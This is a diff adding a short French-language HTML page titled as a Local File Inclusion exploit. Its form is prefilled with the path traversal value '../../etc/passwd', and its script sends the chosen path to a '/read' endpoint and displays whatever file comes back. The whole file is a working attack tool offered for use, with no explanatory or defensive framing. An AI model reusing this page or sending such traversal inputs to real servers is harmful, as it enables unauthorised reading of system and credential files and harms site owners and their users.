@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Local File Inclusion (LFI) Exploit</title>
+</head>
+<body>
+    <h1>Exploit Local File Inclusion (LFI)</h1>
+    <form id="lfiForm">
+        <label for="file">Chemin du fichier :</label>
+        <input type="text" id="file" name="file" value="../../etc/passwd">
+        <button type="submit">Lire le fichier</button>
+    </form>
+    <pre id="output"></pre>
+
+    <script>
+        document.getElementById("lfiForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            let file = document.getElementById("file").value;
+            fetch(`/read?file=${encodeURIComponent(file)}`)
+                .then(response => response.text())
+                .then(data => {
+                    document.getElementById("output").innerText = data;
+                })
+                .catch(error => {
+                    document.getElementById("output").innerText = "Erreur: " + error;
+                });
+        });
+    </script>
+</body>
+</html>
+
